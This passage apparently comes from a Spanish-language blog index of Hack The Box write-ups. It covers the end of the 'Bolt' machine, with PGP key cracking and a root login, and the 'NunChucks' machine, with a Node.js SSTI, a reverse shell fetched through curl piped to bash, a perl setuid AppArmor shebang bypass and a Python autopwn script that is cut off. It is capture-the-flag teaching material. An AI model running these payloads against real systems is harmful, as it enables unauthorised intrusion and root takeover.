ykZzrWNW6Kx2CxFowDd/a3yB4moU\\\\r\\\\nKP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/WpaPSEOG3K5lcpt5EneFC64f\\\\r\\\\na6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67\\\\r\\\\nJAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH\\\\r\\\\nkERD10SVfII2e43HFgU+wXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t/Kz99+\\\\r\\\\nJa9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT\\\\r\\\\nGh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlB\\\\r\\\\nGquB8QmrJA2QST4v+/xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW+nqong\\\\r\\\\ncVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXO\\\\r\\\\nn0LJKVoiPuZr/C0gDkek/i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz\\\\r\\\\n4sOO1YdK7/88KWj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT\\\\r\\\\n4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h\\\\r\\\\nJ6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt\\\\r\\\\n1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS\\\\r\\\\nUCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU\\\\r\\\\nNsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf\\\\r\\\\nQmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\\\r\\\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\\\r\\\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\\\r\\\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\\\r\\\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\\\r\\\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\\\r\\\\nPSwYYWlAywj5\\\\r\\\\n=cqxZ\\\\r\\\\n-----END PGP PRIVATE KEY BLOCK-----Encontramos una clave privada, vamos a arreglarla para que esté en el formato adecuado:eddie@bolt:~$ cat pgp.priv | tr -d '\\n' &gt; keyLuego, dentro de vi borramos este patrón::%s/\\\\\\\\r\\\\\\\\n/\\r/gAhora si vemos la key:eddie@bolt:~$ cat key-----BEGIN PGP PRIVATE KEY BLOCK-----Version: OpenPGP.js v4.10.9Comment: https://openpgpjs.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cqxZ-----END PGP PRIVATE KEY BLOCK-----Ahora si se ve bien. Ahora, deberíamos agregar esta llave privada a gpg, sin embargo, necesitamos una contraseña para eso, por lo tanto, usaremos john para extraer la contraseña de esta clave privada:gpg2john pgpFile pgpEddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson &lt;eddie@bolt.htb&gt;::pgpEsto nos da un hash que podemos intentar romper:john --wordlist=/usr/share/wordlists/rockyou.txt hashpgpUsing default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 16777216 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusmerrychristmas   (Eddie Johnson)     1g 0:00:07:33 DONE (2023-02-15 17:56) 0.002206g/s 94.51p/s 94.51c/s 94.51C/s mhines..menudoUse the \"--show\" option to display all of the cracked passwords reliablyLuego, con esta contraseña (merrychristmas) vamos a agregarla a gpg:gpg --import pgpgpg: /home/kali/.gnupg/trustdb.gpg: trustdb createdgpg: key 1C2741A3DC3B4ABD: public key \"Eddie Johnson &lt;eddie@bolt.htb&gt;\" importedgpg: key 1C2741A3DC3B4ABD: secret key importedgpg: Total number processed: 1gpg:               imported: 1gpg:       secret keys read: 1gpg:   secret keys imported: 1Luego, cuando tenemos agregada la contraseña vamos a pasar a un archivo el mensaje cifrado y descifrarlo utilizando la llave privada:gpg -d mensajegpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25      \"Eddie Johnson &lt;eddie@bolt.htb&gt;\"{\"password\":\"Z(2rmxsNW(Z?3=p/9s\",\"description\":\"\"}gpg: Signature made Sat 06 Mar 2021 10:33:54 AM ESTgpg:                using RSA key 1C2741A3DC3B4ABDgpg: Good signature from \"Eddie Johnson &lt;eddie@bolt.htb&gt;\" [unknown]gpg: WARNING: This key is not certified with a trusted signature!gpg:          There is no indication that the signature belongs to the owner.Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABDTenemos entonces una contraseña, vamos a probar si es de administrador:eddie@bolt:~$ su rootPassword: root@bolt:/home/eddie# whoamiroot¡Bien! Somos administradores, ahora solo falta encontrar la flag:root@bolt:/home/eddie# cd /root/root@bolt:~# cat root.txt6b9b7b7b1cda07d43e4b7cc¡Listo! Hemos terminado la máquina.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "NunChucks HTB Write-up",
    "url": "/posts/Nunchucks/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Web, SSTI, AppArmor bypass, Autopwn, Linux, Easy",
    "date": "2023-02-12 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada NunChucks, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración ...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada NunChucks, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema y subdominios.  SSTI.  AppArmor Bypass (Shebang).  Automatización de la intrusión.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.122PING 10.10.11.122 (10.10.11.122) 56(84) bytes of data.64 bytes from 10.10.11.122: icmp_seq=1 ttl=63 time=143 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS --open -min-rate 5000 10.10.10.239 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http443/tcp open  httpsRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p22,80,443 10.10.11.122 -oN ServiceScanComo resultado del escaneo tenemos:PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)|   256 a2f42c427465a37c26dd497223827271 (ECDSA)|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)80/tcp  open  http     nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://nunchucks.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)| tls-nextprotoneg: |_  http/1.1|_http-title: Nunchucks - Landing Page| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb| Not valid before: 2021-08-30T15:42:24|_Not valid after:  2031-08-28T15:42:24|_ssl-date: TLS randomness does not represent time|_http-server-header: nginx/1.18.0 (Ubuntu)| tls-alpn: |_  http/1.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelObservamos http y https, utilizaremos whatweb para enumerar información:whatweb 10.10.11.122http://10.10.11.122 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]ERROR Opening: https://nunchucks.htb/ - no address for nunchucks.htbObservamos que existe el dominio nunchucks.htb, lo agregaremos al /etc/hosts en caso de que se esté realizando virtual hosting.127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.11.122    nunchucks.htbHaciendo posible ahora la comunicación.whatweb 10.10.11.122http://10.10.11.122 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]Observamos ahora más información de la página, vamos a entrar utilizando el navegador:Es una página estática, sin embargo, tiene una sección de loginSin embargo, no funciona. La de registro tampoco funciona, lo que nos hace pensar que quizas no es por aqui. si realizamos fuzzing no encontraremos nada interesante en este punto. Por lo tanto, buscaremos posibles subdominios:wfuzz -c --hc=404,403 --hh=30587 -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.nunchucks.htb\" -t 200 https://nunchucks.htb=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                                           =====================================================================000000081:   200        101 L    259 W      4028 Ch     \"store\" Ocultando el codigo 404 y el largo de 30587, pues esta página tenía gran cantidad de direcciones que no llevaban a ningún lado.Tenemos entonces un subdominio llamado store, vamos a revisarlo:Tenemos una sección para enviar algo, vamos a probarla:ExplotaciónObservamos que en la respuesta You will receive updates on the following email address: test@test.com. está nuestro imput, quiere decir que al menos si se está realizando la petición, utilizaremos Burpsuite para analizar:Observamos que nuestro imput se reconoce allá, si probamos diferentes injecciones nos daremos cuenta que al parecer no es vulnerable, hasta que intentamos con SSTI, si vamos a la página de HackTricks, encontraremos varias formas de probar SSTI, probaremos con la primera:Observamos que el resultado es 49, lo que hace vulnerable a SSTI al sitio, ahora tenemos que identificar a qué tipo pertenece.Si provocamos un error vemos lo siguiente:Observamos /var/www/store.nunchucks/node_modules/ lo que nos dice que se trata de un servidor utilizando node.js.Otra forma puede ser utilizando wappalyzer:Bien, si filtramos por node.js en la web de HackTricks encontramos diversos, pero hay uno que tiene un nombre particular y si probamos cada uno de los test darán todos como debería:Vamos a intentar utilizar el primer payload:Utilizando backslash escapamos las comillas dobles y al enviarlo vemos que ha listado correctamente el archivo /etc/passwd, por lo tanto, ahora solo falta ganar acceso.Para ello utilizaremos el siguiente comando (va en doble llave):range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('curl 10.10.14.17 | bash')\\\")()Haremos una petición a nuestro servidor http, el cual estará compartiendo este archivo index.html:#!/bin/bash bash -i &gt;&amp; /dev/tcp/10.10.14.17/1235 0&gt;&amp;1 Y a su vez, estaremos escuchando con netcat por el puerto 1235, si mandamos la información:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.122 - - [12/Feb/2023 01:13:05] \"GET / HTTP/1.1\" 200 -Y en el netcat:nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.122] 43250bash: cannot set terminal process group (1005): Inappropriate ioctl for devicebash: no job control in this shelldavid@nunchucks:/var/www/store.nunchucks$ ¡Bien!, estamos dentro de la máquina, buscamos la flag:david@nunchucks:~$ cat user.txtcat user.txte707026421f7744f3c6c7a7a6Excelente ahora toca escalar privilegios.Escalada de privilegiosdavid@nunchucks:~$ iduid=1000(david) gid=1000(david) groups=1000(david)david@nunchucks:~$ sudo -l[sudo] password for david: Sorry, try again.[sudo] password for david: sudo: 1 incorrect password attemptdavid@nunchucks:~$ netstat -natCommand 'netstat' not found, but can be installed with:apt install net-toolsPlease ask your administrator.No podemos ver los privilegios porque no tenemos la contraseña.Si buscamos por SUID encontramos cosas:david@nunchucks:~$ find / -perm -4000 2&gt;/dev/null/usr/bin/fusermount/usr/bin/umount/usr/bin/chsh/usr/bin/chfn/usr/bin/at/usr/bin/mount/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/passwd/usr/bin/pkexec/usr/bin/su/usr/bin/sudo/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/sbin/pppdSin embargo, no utilizaremos pkexec para escalar privilegios.Podríamos ver las capabilities:david@nunchucks:~$ getcap -r / 2&gt;/dev/null/usr/bin/perl = cap_setuid+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/ping = cap_net_raw+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+epdavid@nunchucks:~$ Observamos la capabilitie setuid para perl, buscamos en gtfobins para ver si hay posibilidad de escalar privilegios:Vemos una forma de ejecutar comandos de forma privilegiada con esto:perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'Vamos a intentarlo:david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'Sin embargo, no ocurre nada. Si probamos con otro comando:david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"whoami\";'rootEn este caso si lo ejecuta.david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"ls /root/\";'ls: cannot open directory '/root/': Permission deniedY ahora no.david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"ls -la /root/root.txt\";'-r-------- 1 root root 33 Feb 14 05:17 /root/root.txtY ahora si, esto nos hace pensar que de alguna forma hay reglas definidas para qué cosas puedes hacer o puede ver. Si buscamos en la web encontramos que existe, por ejemplo, SELinux, que es un módulo de seguridad para el kernel de linux. Si buscamos algunas variantes de esto encontramos AppArmor, el cual funciona como un módulo de seguridad, sin embargo, restringe las capacidades de un programa y permite administrar todo eso. Podría ser que se esté aplicando, vamos a buscar si encontramos algo de eso en la máquina.david@nunchucks:/etc/apparmor$ find / -name *apparmor* 2&gt;/dev/null | grep -vE \"var|proc|sys\"/usr/share/doc/apparmor-notify/usr/share/doc/apparmor/usr/share/doc/python3-apparmor/usr/share/doc/libapparmor-perl/usr/share/doc/apparmor-easyprof/usr/share/doc/python3-libapparmor/usr/share/doc/libapparmor1/usr/share/doc/apparmor-utils/usr/share/apport/package-hooks/source_apparmor.py/usr/share/lintian/overrides/apparmor-notify/usr/share/lintian/overrides/apparmor/usr/share/lintian/overrides/python3-apparmor/usr/share/lintian/overrides/libapparmor-perl/usr/share/lintian/overrides/apparmor-easyprof/usr/share/lintian/overrides/python3-libapparmor/usr/share/lintian/overrides/libapparmor1/usr/share/lintian/overrides/apparmor-utils/usr/src/linux-headers-5.4.0-86/security/apparmor/usr/src/linux-headers-5.4.0-81-generic/include/config/security/apparmor/usr/src/linux-headers-5.4.0-81-generic/include/config/security/apparmor.h/usr/src/linux-headers-5.4.0-81-generic/include/config/default/security/apparmor.h/usr/src/linux-headers-5.4.0-86-generic/include/config/security/apparmor/usr/src/linux-headers-5.4.0-86-generic/include/config/security/apparmor.h/usr/src/linux-headers-5.4.0-86-generic/include/config/default/security/apparmor.h/usr/src/linux-headers-5.4.0-81/security/apparmor/etc/apparmor.d/etc/apparmor.d/abstractions/apparmor_api/etc/apparmor.d/tunables/apparmorfs/etc/xdg/autostart/apparmor-notify.desktop/etc/apparmor/etc/rcS.d/S01apparmor/etc/init.d/apparmorEncontramos cosas sobre apparmor, lo que quiere decir que si se está aplicando en este caso.Entraremos al /etc/apparmor.d:david@nunchucks:/etc/apparmor$ cd /etc/apparmor.ddavid@nunchucks:/etc/apparmor.d$ lsabstractions  disable  force-complain  local  lsb_release  nvidia_modprobe  sbin.dhclient  tunables  usr.bin.man  usr.bin.perl  usr.sbin.ippusbxd  usr.sbin.mysqld  usr.sbin.rsyslogd  usr.sbin.tcpdumpdavid@nunchucks:/etc/apparmor.d$ Podemos que se encuentra el usr.bin.perl:# Last Modified: Tue Aug 31 18:25:30 2021#include &lt;tunables/global&gt;/usr/bin/perl {  #include &lt;abstractions/base&gt;  #include &lt;abstractions/nameservice&gt;  #include &lt;abstractions/perl&gt;  capability setuid,  deny owner /etc/nsswitch.conf r,  deny /root/* rwx,  deny /etc/shadow rwx,  /usr/bin/id mrix,  /usr/bin/ls mrix,  /usr/bin/cat mrix,  /usr/bin/whoami mrix,  /opt/backup.pl mrix,  owner /home/ r,  owner /home/david/ r,}Acá podemos ver los permisos que tienen definidos para este binario, en este punto debemos pensar en encontrar una forma de burlar esta seguridad, vamos a buscar algun bug o falla de este sistema por la web, encontramos en la web de HackTricks una forma de bypass de apparmor, la cual es hacer uso del Shebang, que corresponde a las cabeceras en los archivos tipo !#/bin/bash, esto quiere decir que podemos ejecutar con perl un archivo si utilizamos la cabecera, y apparmor no nos limitará. Para esto crearemos el siguiente archivo:#!/usr/bin/perluse POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";Llamaremos a este archivo test.sh, si lo ejecutamos:david@nunchucks:~$ ./test.sh# whoamirootDe esta forma burlamos el apparmor y pudimos cambiarnos el uid a 0 y spawnear un shell. Siendo ya root buscamos la flag: cat root.txta275bba6e914afcf25ff7bef2d¡Listo! Nos hemos convertido en administrador.Antes de terminar, como extra haremos la automatización de la intrusión en python.Las librerías son las siguientes:import requests,subprocess,socketfrom pwn import *Las variables globales son:ipHost = sys.argv[1]nunIP = 'https://store.nunchucks.htb/api/submit's = requests.Session()Luego, tenemos la primera función que se encarga de escribir en un archivo llamado index.html, el cual lleva el código para entablar la conexión hacia nuestra máquina:def html_payload():    with open(\"index.html\",\"w\") as file:        Shebang = \"#!/bin/bash\\n\"        payload =f'bash -i &gt;&amp; /dev/tcp/{ipHost}/1234 0&gt;&amp;1'        file.write(Shebang)        file.write(payload)La siguiente funición se encarga de explotar el SSTI:def ssti():    payload = \"\"\" {\\{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('curl %s | bash')\\\")()}} \"\"\" % ipHost    # el primer backslash del payload no va, es solo para que la sintaxis de md me deje poner el payload.    post_data = {         \"email\": payload     }    print(\"[+] Explotando el SSTI\")    r = s.post(nunIP,data=post_data,verify=False)La última función corresponde a la del servidor http:def http_server():    try:        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:            so.bind(('localhost', 80))            http_server = subprocess.Popen([\"python3\", \"-m\", \"http.server\", \"80\"])    except OSError:            print(\"\\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor\")Finalmente, tenemos el main:if __name__ == '__main__':    print(\"[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts.\")    html_payload()    sleep(2)       http_server()    threading.Thread(target=ssti, args=()).start()    shell = listen(1234,timeout=20).wait_for_connection()    shell.interactive()Acá tenemos las llamadas a las funciones.El código completo es el siguiente:import requests,subprocess,socketfrom pwn import *def def_handler(sig, frame):    print(\"\\n\\n[!] saliendo...\\n\")    sys.exit(1)signal.signal(signal.SIGINT, def_handler)if len(sys.argv) &lt; 2:    print(f'[!] Uso: python3 {sys.argv[0]} \"Tu IP\"\\n' )    sys.exit(1)ipHost = sys.argv[1]nunIP = 'https://store.nunchucks.htb/api/submit's = requests.Session()def html_payload():    with open(\"index.html\",\"w\") as file:        Shebang = \"#!/bin/bash\\n\"        payload =f'bash -i &gt;&amp; /dev/tcp/{ipHost}/1234 0&gt;&amp;1'        file.write(Shebang)        file.write(payload)def ssti():    payload = \"\"\" {\\{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('curl %s | bash')\\\")()}} \"\"\" % ipHost    # el primer backslash del payload no va, es solo para que la sintaxis de md me deje poner el payload.    post_data = {         \"email\": payload     }    print(\"[+] Explotando el SSTI\")    r = 